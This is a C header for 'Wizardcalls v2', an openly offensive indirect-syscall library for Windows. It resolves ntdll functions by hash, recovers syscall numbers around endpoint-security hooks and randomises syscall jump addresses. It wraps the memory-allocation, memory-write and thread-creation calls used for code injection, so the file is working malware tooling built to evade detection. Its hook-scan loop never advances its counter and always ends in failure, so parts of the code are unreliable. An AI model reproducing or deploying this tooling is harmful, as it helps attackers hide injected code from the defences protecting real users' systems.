/*
	Wizardcalls v2. An indirect syscall utility with hook bypassing capabilities.

	Based on:
		https://github.com/am0nsec/HellsGate
		https://github.com/Maldev-Academy/HellHall
		https://github.com/trickster0/TartarusGate
*/
# pragma once
# include <windows.h>


/* ------------------ Control Macros ------------------ */

# define RANDOMIZE_JUMP_ADDRESS
# define wc_DEBUG

/* ------------------- Value Macros ------------------- */

// Misc
# define wc_HASH_SEED		7627
# define SYSCALL_LIST_NAME	pSyscallList
# define NT_SUCCESS			0x0

// Dlls
# define wc_NTDLL					0x45FB4B09

// Functions
#define wc_NTALLOCATEVIRTUALMEMORY	0xEDEBBBFE
#define wc_NTFREEVIRTUALMEMORY		0x215B656F
#define wc_NTWRITEVIRTUALMEMORY		0x9EA23BFE
#define wc_NTCREATETHREADEX			0x9AE1FB4A
#define wc_NTWAITFORSINGLEOBJECT	0xA41B21EA

#define wc_HASHES wc_NTALLOCATEVIRTUALMEMORY,wc_NTFREEVIRTUALMEMORY,wc_NTWRITEVIRTUALMEMORY,wc_NTCREATETHREADEX,wc_NTWAITFORSINGLEOBJECT


// x64 op codes
#define RET					0xC3
#define JNE					0x75
#define MOV					0x4C
#define MOV2				0xB8
#define R10					0x8B
#define RCX					0xD1
#define JMP					0xE9
#define NULL_BYTE			0x00

// Offsets
# define SYSCALL_OFFSET		18
# define JNE_INT2E_OFFSET	3
# define UP				   -32
# define DOWN				32
# define SYSCALL_STUB_SIZE	32


/* ----------------- Function Macros ------------------ */

# ifdef wc_DEBUG
# include <stdio.h>
# define wc_dbg( msg, ... )		printf( "[DEBUG]::Wizardcalls.%s.L%d -> " msg "\n", __func__, __LINE__, ##__VA_ARGS__ )
# endif

# ifndef wc_DEBUG
# define wc_dbg( msg, ... )		do {} while (0)
# endif

# define WzDInit()				PSYSCALL_LIST SYSCALL_LIST_NAME = InitializeSystemCalls();
# define HashStringA( String )	HashStringSdbmA( String )
# define HashStringW( String )	HashStringSdbmW( String )

# define WzDAllocateVirtualMemory( ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protection ) \
	NtAllocateVirtualMemory( SYSCALL_LIST_NAME, ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protection )

# define WzDWriteVirtualMemory( ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWrittenit ) \
	NtWriteVirtualMemory( SYSCALL_LIST_NAME, ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWrittenit )

# define WzDFreeVirtualMemory( ProcessHandle, BaseAddress, RegionSize, FreeTypeThis ) \
	NtFreeVirtualMemory( SYSCALL_LIST_NAME, ProcessHandle, BaseAddress, RegionSize, FreeTypeThis )

# define WzDCreateThread( ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList ) \
	NtCreateThreadEx( SYSCALL_LIST_NAME, ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList )

# define WzDWaitForSingleObject(Handle, Alertable, Timeout) \
	NtWaitForSingleObject( SYSCALL_LIST_NAME, Handle, Alertable, Timeout )

/* -------------------- Prototypes -------------------- */

typedef ( NTAPI* fpWzDAllocate ) ( HANDLE ProcessHandle, PVOID * BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protection );

/* -------------------- Structures -------------------- */

typedef struct _CLIENT_ID_
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _UNICODE_STRING_
{
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING_, * PUNICODE_STRING_;

typedef struct _LOADER_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING_ FullDllName;
	UNICODE_STRING_ BaseDllName;
} LOADER_DATA_TABLE_ENTRY, * PLOADER_DATA_TABLE_ENTRY;

typedef struct _PEB_LOADER_DATA
{
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	BOOLEAN ShutdownInProgress;
	HANDLE ShutdownThreadId;
} PEB_LOADER_DATA, * PPEB_LOADER_DATA;

typedef struct _CURDIR
{
	UNICODE_STRING_ DosPath;
	HANDLE Handle;
} CURDIR, * PCURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;
	ULONG Flags;
	ULONG DebugFlags;
	HANDLE ConsoleHandle;
	ULONG ConsoleFlags;
	HANDLE StandardInput;
	HANDLE StandardOutput;
	HANDLE StandardError;
	CURDIR CurrentDirectory;
	UNICODE_STRING_ DllPath;
	UNICODE_STRING_ ImagePathName;
	UNICODE_STRING_ CommandLine;
	PVOID Environment;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PROC_ENV_BLOCK
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	HANDLE Mutant;
	PVOID ImageBaseAddress;
	PPEB_LOADER_DATA Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
} PROC_ENV_BLOCK, * PPROC_ENV_BLOCK;

typedef struct _TEB_ {
	NT_TIB ThreadInformationBlock;
	PPROC_ENV_BLOCK  ProcessEnvironmentBlock;
	CLIENT_ID ClientId;
} THREAD_ENV_BLOCK, *PTHREAD_ENV_BLOCK;

typedef struct _SYSCALL_ 
{
	DWORD SSN;
	PVOID JumpAddress;
} SYSCALL, *PSYSCALL;

typedef struct _SYSCALL_LIST_ 
{
	SYSCALL NtAllocateVirtualMemory;
	SYSCALL NtFreeVirtualMemory;
	SYSCALL NtWriteVirtualMemory;
	SYSCALL NtCreateThreadEx;
	SYSCALL NtWaitForSingleObject;
} SYSCALL_LIST, *PSYSCALL_LIST;

/* -------------------- Functions --------------------- */

/*
	@brief
		Sets RBX to syscall structure pointer

	@param[in]	PSYSCALL pSyscall
		A pointer to a syscall structure

	@return
		None
*/
extern VOID SetSyscallPointer( PSYSCALL pSyscall );


/*
	@brief
		Executes a system call

	@return
		The status of the system call as NTSTATUS
*/
extern NTSTATUS SystemCall();


/*
	@brief
		Generate a random number using Linear Congruential Generation (LCG).

	@param[in] seed
		Any random number, used to generate entropy

	@return
		Returns a random number as int
*/
int _rand( int seed )
{
	unsigned int a = 1664525;
	unsigned int c = 1013904223;
	unsigned int m = 0xFFFFFFFF;
	seed = ( int )( ( a * seed + c ) % m );
	return seed;
}


/*
	@brief
		Convert a wide string to a hash using SDBM algorithm

	@param[in]	LPCSTR String
		a wide string to hash

	@return
		A hash of the input string as a DWORD
*/
DWORD HashStringSdbmW( _In_ LPCWSTR String )
{
	ULONG Hash = wc_HASH_SEED;
	INT c;

	while ( c = *String++ )
		Hash = c + ( Hash << 6 ) + ( Hash << 16 ) - Hash;

	return Hash;
}


/*
	@brief
		Convert ansi string to a hash using SDBM algorithm

	@param[in]	LPCSTR String
		ANSI string to hash

	@return
		A hash of the input string as a DWORD
*/
DWORD HashStringSdbmA(_In_ LPCSTR String)
{
	ULONG Hash = wc_HASH_SEED;
	INT c;

	while (c = *String++)
		Hash = c + (Hash << 6) + (Hash << 16) - Hash;

	return Hash;
}


/*
	@brief
		Zero out a memory block

	@param[in] PVOID  pMemory
		The base address of the buffer to zero

	@param[in] SIZE_T Size
		The size of the buffer

	@return
		None
*/
VOID ZeroMem(PVOID pMemory, SIZE_T Size)
{
	PBYTE  pBase;

	if ((pBase = (PBYTE)pMemory) == NULL)
		return;

	for (SIZE_T Index = 0; Index < Size; Index++, pBase++)
	{
		*pBase = 0;
	}

	return;
}


/*
	@brief
		Enumerates the modules loaded in the current process for
		a module by hash of the module name. Module name is converted
		to lower case prior to hashing.

	@param[in]	DWORD Hash
		A hash of the module name to search for

	@return
		A handle to the module if found otherwise NULL
*/
HMODULE GetPebModuleByHash( DWORD Hash ) 
{

	WCHAR						ModuleName[ MAX_PATH ];
	WCHAR						Letter;
	INT							Index;
	PLOADER_DATA_TABLE_ENTRY	pLoadedModule;
	PPROC_ENV_BLOCK				pPeb;

	/* Get a pointer to the process environment block */
	if ( ( pPeb = ( PPROC_ENV_BLOCK )__readgsqword( 0x60 ) ) == NULL ) 
	{
		wc_dbg( "NULL was returned for PEB." );
		return NULL;
	}

	/* Enumerate the modules that loaded in this process */
	for (
		pLoadedModule = ( PLOADER_DATA_TABLE_ENTRY )pPeb->Ldr->InLoadOrderModuleList.Flink;
		pLoadedModule->DllBase != NULL;
		pLoadedModule = ( PLOADER_DATA_TABLE_ENTRY )pLoadedModule->InLoadOrderLinks.Flink
	) 
	{
		if ( pLoadedModule->BaseDllName.Length && pLoadedModule->BaseDllName.Length < MAX_PATH ) 
		{
			for ( Index = 0; Index < pLoadedModule->BaseDllName.Length; Index++ ) 
			{
				Letter = ( WCHAR ) ( pLoadedModule->BaseDllName.Buffer[ Index ] );
				ModuleName[ Index ] = ( Letter >= L'A' && Letter <= L'Z' && Letter != 0x00 ) ? Letter + 0x20 : Letter;
			}
			ModuleName[ Index++ ] = '\0';

			if ( HashStringW( ModuleName ) == Hash )
			{
				wc_dbg( "Resolved 0x%0.8X to %S at 0x%p", Hash, ModuleName, pLoadedModule->DllBase );
				return ( HMODULE )pLoadedModule->DllBase;
			}
		}
	}

	wc_dbg( "Could not resolve 0x%0.8X to any module in this process.", Hash );
	return NULL;
}


/*
	@brief
		Intializes the system call list. Needs to be called prior to using system calls.

	@return
		A pointer to the system call list structure (PSYSCALL_LIST)
*/
PSYSCALL_LIST InitializeSystemCalls()
{

# ifdef RANDOMIZE_JUMP_ADDRESS
								// Use the current process id as the initial entropy source for the rng algo seed
	INT							Seed = ( DWORD ) ( ULONG_PTR ) ( ( PTHREAD_ENV_BLOCK )__readgsqword( 0x30 ) )->ClientId.UniqueProcess;
# endif

	PIMAGE_NT_HEADERS			pNtHeaders;
	PIMAGE_EXPORT_DIRECTORY		pExportDirectory;
	PDWORD						pFunctionNames, pFunctionAddreses;
	PWORD						pOrdinals;
	ULONG_PTR					DllBase;
	PSYSCALL_LIST				pSyscallList = 0;
	PSYSCALL					pSyscall;
	PBYTE						pFuncAddr;
	NTSTATUS					Status;
	fpWzDAllocate				WzDAllocate = 0;
	DWORD						Hashes[ sizeof( wc_HASHES ) + 1 ] = { wc_HASHES };
	SIZE_T						SyscallListSize = sizeof(SYSCALL_LIST);

	wc_dbg( "Initializing system calls..." );

	/* Acquire NTDLLs base address */
	if ( ( DllBase = ( ULONG_PTR ) GetPebModuleByHash( wc_NTDLL ) ) == 0 )
		return NULL;

	/* Parse NT Headers */
	pNtHeaders = ( PIMAGE_NT_HEADERS ) ( DllBase + ( ( PIMAGE_DOS_HEADER )DllBase )->e_lfanew );
	if ( pNtHeaders->Signature != IMAGE_NT_SIGNATURE ) 
	{
		wc_dbg( "NT signature mismatch while parsing ntdll at 0x%p", ( PVOID )DllBase );
		return NULL;
	}

	/* Get export directory, function names, addresses & ordinals */
	pExportDirectory	= ( PIMAGE_EXPORT_DIRECTORY ) ( DllBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
	pFunctionAddreses	= ( PDWORD ) ( DllBase + pExportDirectory->AddressOfFunctions );
	pFunctionNames		= ( PDWORD ) ( DllBase + pExportDirectory->AddressOfNames );
	pOrdinals			= ( PWORD )  ( DllBase + pExportDirectory->AddressOfNameOrdinals );

	
	/* Locate NtAllocateVirtualMemory to create the syscall list*/
	for ( unsigned int OrdinalIndex = 0; OrdinalIndex < pExportDirectory->NumberOfNames; OrdinalIndex++ )
		if ( HashStringA( ( PCHAR ) ( DllBase + pFunctionNames[ OrdinalIndex ] ) ) == wc_NTALLOCATEVIRTUALMEMORY )
		{
			WzDAllocate = ( fpWzDAllocate ) ( DllBase + pFunctionAddreses[ pOrdinals [ OrdinalIndex ] ] );
		}

	if ( !WzDAllocate )
	{
		wc_dbg( "Could not locate NtAllocateVirtualMemory" );
		return NULL;
	}

	/* Create & populate syscall list */
	if ( ( Status = WzDAllocate( ( HANDLE )-1, ( PVOID* )&pSyscallList, 0, &SyscallListSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) != NT_SUCCESS )
	{
		wc_dbg( "Could not allocate memory for syscall list. 0x%0.8X", Status );
		return NULL;
	}
	ZeroMem( ( PVOID )pSyscallList, sizeof( SYSCALL_LIST ) );

	/* Populate syscall list */
	pSyscall = ( PSYSCALL )pSyscallList;
	for ( unsigned int SyscallIndex = 0; SyscallIndex < ( sizeof( SYSCALL_LIST ) / sizeof( SYSCALL ) ); SyscallIndex++ )	// Iterate over each syscall in syscall list structure
	{
		for ( unsigned int OrdinalIndex = 0; OrdinalIndex < pExportDirectory->NumberOfNames; OrdinalIndex++ )				// Iterate over each function in ntdll
		{
			if ( HashStringA( ( PCHAR ) ( DllBase + pFunctionNames[ OrdinalIndex ] ) ) == Hashes[ SyscallIndex ] )		// Check if function hash matches specified hash. If match, begin resolving SSN.
			{

# ifndef wc_DEBUG
				/* Wipe hash from memory */
				ZeroMem( &Hashes[ SyscallIndex ], sizeof( DWORD ) );
# endif
				pFuncAddr = ( PBYTE ) DllBase + pFunctionAddreses[ pOrdinals[ OrdinalIndex ] ];

				/* 
					Get SSN if syscall is not hooked. SSN will be at offset 4 of function base address.

					00007FF9C79ED090 | 4C:8BD1     | mov r10,rcx |
					00007FF9C79ED093 | B8 06000000 | mov eax,6   |
				*/
				if ( 
					pFuncAddr[ 0 ] == MOV  && pFuncAddr[ 1 ] == R10       && pFuncAddr[ 2 ] == RCX && 
					pFuncAddr[ 3 ] == MOV2 && pFuncAddr[ 6 ] == NULL_BYTE && pFuncAddr[ 7 ] == NULL_BYTE
				) 
				{
					pSyscall->SSN = *( PDWORD )( pFuncAddr + 4 );
				}

				/* Check if a hook is present */
				else if ( pFuncAddr[0] == JMP || pFuncAddr[3] == JMP )
				{
					wc_dbg( "Detected a hook in %s", ( PCHAR )( DllBase + pFunctionNames[ OrdinalIndex ] ) );
					for ( int syscall_stub_index = 1; syscall_stub_index <= 255; syscall_stub_index ) 
					{

						/* Check down from the hook for neighboring syscalls */
						if ( 
							pFuncAddr[ 0 + syscall_stub_index * DOWN ] == MOV  && pFuncAddr[ 1 + syscall_stub_index * DOWN ] == R10       && pFuncAddr[ 2 + syscall_stub_index * DOWN ] == RCX &&
							pFuncAddr[ 3 + syscall_stub_index * DOWN ] == MOV2 && pFuncAddr[ 6 + syscall_stub_index * DOWN ] == NULL_BYTE && pFuncAddr[ 7 + syscall_stub_index * DOWN ] == NULL_BYTE
						) 
						{
							pSyscall->SSN = *( PDWORD )( &pFuncAddr[ 4 + syscall_stub_index * DOWN ] ) - syscall_stub_index;
							break;
						}

						/* Check up from the hook for neighboring syscalls */
						if (
							pFuncAddr[ 0 + syscall_stub_index * UP ] == MOV  && pFuncAddr[ 1 + syscall_stub_index * UP ] == R10 && pFuncAddr[ 2 + syscall_stub_index * UP ] == RCX && 
							pFuncAddr[ 3 + syscall_stub_index * UP ] == MOV2 && pFuncAddr[ 6 + syscall_stub_index * UP ] == NULL_BYTE && pFuncAddr[ 7 + syscall_stub_index * UP ] == NULL_BYTE) 
						{
							pSyscall->SSN = *( PDWORD ) ( &pFuncAddr[4 + syscall_stub_index * UP ] ) + syscall_stub_index;
							break;
						}
					}
					wc_dbg( "Could not locate SSN." );
					return NULL;
				}

				/* Fail if no ssn or hook is found */
				else 
				{
					wc_dbg( "Could not locate an SSN." );
					return NULL;
				}

# ifndef RANDOMIZE_JUMP_ADDRESS

				/* Get the jump address of the syscall. I found that it's 18 bytes away from the function base */
				pSyscall->JumpAddress = ( PVOID ) ( pFuncAddr + SYSCALL_OFFSET );

# endif

# ifdef RANDOMIZE_JUMP_ADDRESS

				/* Locate a random syscall (0x0405) instruction address */
				for ( unsigned int j = 0; j < pExportDirectory->NumberOfNames; j++ )				// Begin a loop with iterations == to the number of functions in ntdll
				{
					Seed		= _rand( Seed ) % pExportDirectory->NumberOfNames;					// Get a random value <= the number of functions in ntdll & index into the
					pFuncAddr	= ( PBYTE ) ( DllBase + pFunctionAddreses[ pOrdinals[ Seed ] ] );	// function array to get a random function
					for ( unsigned int i = 0; i < SYSCALL_STUB_SIZE; i++ )
					{
						/*
							Validate instruction is a syscall by verifying the surrounding instructions [jne, ret, ret]

							00007FF9C79EDE10 | 75 03 | jne ntdll.7FF9C79EDE15 | 1. Check for the bytes 0x75 (jne), 0x03 (offset) before syscall
							00007FF9C79EDE12 | 0F05  | syscall                | 4. Get the syscall
							00007FF9C79EDE14 | C3    | ret                    | 2. Check for C3 (ret) byte 
							00007FF9C79EDE15 | CD 2E | int 2E                 |
							00007FF9C79EDE17 | C3    | ret                    | 3. Check for C3 (ret) byte
						*/
						if ( 
							pFuncAddr[ i ]	   == JNE && pFuncAddr[ i + 1 ] == JNE_INT2E_OFFSET && 
							pFuncAddr[ i + 4 ] == RET && 
							pFuncAddr[ i + 7 ] == RET )
						{
							pSyscall->JumpAddress = ( PVOID ) ( pFuncAddr + SYSCALL_OFFSET );
							break;
						}
					}

					/* Terminate search when syscall is found */
					if ( pSyscall->JumpAddress )
						break;
				}
# endif
				if ( !pSyscall->SSN || !pSyscall->JumpAddress )
				{
					wc_dbg( "Could not locate either SSN or syscall jump address." );
					return NULL;
				}

# ifndef RANDOMIZE_JUMP_ADDRESS
				wc_dbg( "Resolved 0x%0.8X to %s at 0x%p\n\t[+] > SSN: 0x%0.2X\n\t[+] > Jump Address: 0x%p", Hashes[ SyscallIndex ], ( PCHAR ) ( DllBase + pFunctionNames[ OrdinalIndex ] ), pFuncAddr, pSyscall->SSN, pSyscall->JumpAddress );
# endif

# ifdef RANDOMIZE_JUMP_ADDRESS
				wc_dbg( "Resolved 0x%0.8X to %s at 0x%p\n\t[+] > SSN: 0x%0.2X\n\t[+] > Jump Address: 0x%p ( %s )", Hashes[ SyscallIndex ], ( PCHAR )( DllBase + pFunctionNames[ OrdinalIndex ] ), pFuncAddr, pSyscall->SSN, pSyscall->JumpAddress, ( PCHAR ) ( DllBase + pFunctionNames[ Seed ] ) );
# endif
			}
		}

		/* Move to next syscall */
		pSyscall++;
	}
	
	wc_dbg( "Syscall initialization successful!" );
	return pSyscallList;
}


NTSTATUS NtAllocateVirtualMemory(PSYSCALL_LIST pSyscallList, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protection)
{
	SetSyscallPointer(((PSYSCALL) & (pSyscallList->NtAllocateVirtualMemory)));
	return SystemCall(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protection);
};


NTSTATUS NtFreeVirtualMemory(PSYSCALL_LIST pSyscallList, HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeTypeThis)
{
	SetSyscallPointer(((PSYSCALL) & (pSyscallList->NtFreeVirtualMemory)));
	return SystemCall(ProcessHandle, BaseAddress, RegionSize, FreeTypeThis);
};


NTSTATUS NtWriteVirtualMemory(PSYSCALL_LIST pSyscallList, HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWrittenit)
{
	SetSyscallPointer(((PSYSCALL) & (pSyscallList->NtWriteVirtualMemory)));
	return SystemCall(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWrittenit);
};


NTSTATUS NtCreateThreadEx(PSYSCALL_LIST pSyscallList, PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList)
{
	SetSyscallPointer((PSYSCALL) & (pSyscallList->NtCreateThreadEx));
	return SystemCall(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
};


NTSTATUS NtWaitForSingleObject(PSYSCALL_LIST pSyscallList, HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout)
{
	SetSyscallPointer((PSYSCALL) & (pSyscallList->NtWaitForSingleObject));
	return SystemCall(Handle, Alertable, Timeout);
};